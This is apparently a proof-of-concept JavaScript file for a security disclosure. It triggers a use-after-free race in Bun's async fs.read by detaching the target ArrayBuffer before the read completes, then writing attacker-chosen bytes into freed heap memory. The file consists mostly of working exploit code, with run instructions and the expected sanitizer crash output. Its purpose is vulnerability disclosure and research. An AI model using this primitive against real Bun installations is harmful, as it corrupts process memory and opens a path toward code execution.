// Minimal PoC: Bun async fs.read BufferSource use-after-free / detach race
//
// What this demonstrates
// ----------------------
// Local JavaScript with access to `node:fs` can corrupt Bun's native heap by
// scheduling an async `fs.read` against a BufferSource and detaching the
// backing ArrayBuffer before the I/O completes. Bun's read worker continues
// to write into the freed (or reclaimed) backing store. The bytes of that
// write are fully attacker-controlled and the crashing dereference address
// observed by AddressSanitizer matches the attacker payload byte exactly.
//
// Trigger surface
// ---------------
// Vanilla `node:fs` API. No FFI, no `bun:ffi`, no `Bun.dlopen`, no spray, no
// JIT warming, no JSC internals. The bug is reachable from any JavaScript
// that can call `fs.read` with a BufferSource and call `ArrayBuffer.transfer`
// or `structuredClone({}, { transfer: [ab] })`.
//
// How to run
// ----------
//   ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:\
//     quarantine_size_mb=0 \
//   PAYLOAD_BYTE=0xab BUF_SIZE=512 ITERATIONS=64 \
//     /path/to/bun-asan lab/findings/cve-disclosure/poc-minimal-fs-read-uaf.js
//
// Expected ASAN output (confirms attacker control of the crashing address)
// ------------------------------------------------------------------------
//   ==NNNN==ERROR: AddressSanitizer: SEGV on unknown address 0xababababababab__
//   ==NNNN==The signal is caused by a READ memory access.
//
// Each byte of the dereferenced address equals PAYLOAD_BYTE (the attacker
// chosen fill byte). Set `PAYLOAD_BYTE=0x43` and the address becomes
// 0x4343434343434330; set `PAYLOAD_BYTE=0xcd` and it becomes
// 0xcdcdcdcdcdcdcd__. This proves the controlled-write primitive.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 64);
const size = Number(process.env.BUF_SIZE || 512);
const payloadByte = Number(process.env.PAYLOAD_BYTE || 0x43) & 0xff;
const path = join(tmpdir(), `bun-cve-poc-fs-read-${process.pid}`);

const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mk.status !== 0) throw new Error(`mkfifo failed: ${mk.status}`);

const fd = fs.openSync(path, fs.constants.O_RDWR);
const payload = Buffer.alloc(size, payloadByte);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone(ab, { transfer: [ab] });
}

function gcNow() {
  if (typeof Bun?.gc === "function") Bun.gc(true);
}

async function step(i) {
  // 1. allocate a fresh ArrayBuffer / BufferSource owned only by JS.
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);

  // 2. schedule async fs.read into that buffer. Bun's read worker captures a
  //    raw pointer into the backing store at this point.
  const done = new Promise((resolve) => {
    fs.read(fd, view, 0, view.byteLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  // 3. detach the buffer from JS *before* the read worker has produced data.
  //    JSC frees the backing store; `view` becomes a zero-byte detached array.
  detach(ab);
  gcNow();

  // 4. release the read worker by writing on the FIFO. The worker now writes
  //    `payload` bytes into the previously freed backing store. Depending on
  //    the size class, that allocation may have been handed back to Bun's
  //    heap; `payload` therefore becomes attacker-controlled bytes inside an
  //    otherwise-live Bun internal allocation.
  fs.writeSync(fd, payload, 0, payload.length);
  await done;
}

try {
  for (let i = 1; i <= iterations; i++) {
    await step(i);
    if (i % 16 === 0) {
      console.error(`[poc] iteration=${i} payload=0x${payloadByte.toString(16).padStart(2, "0")}`);
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
console.error("[poc] no crash this run; re-run or sweep BUF_SIZE / iterations");
